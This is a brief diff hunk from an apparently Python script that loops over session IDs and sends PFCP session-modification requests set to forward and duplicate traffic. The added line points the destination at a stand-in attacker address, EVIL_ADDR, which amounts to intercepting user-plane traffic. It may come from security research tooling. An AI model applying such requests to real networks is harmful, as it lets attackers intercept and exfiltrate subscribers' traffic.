@@ -203,6 +203,7 @@ for seid in range(1,10):
             src_port=SRC_PORT,
             dest_port=DEST_PORT,
             apply_action=["FORW", "DUPL"],
+            tdest_addr=EVIL_ADDR
             
         )
         send(modif_req)
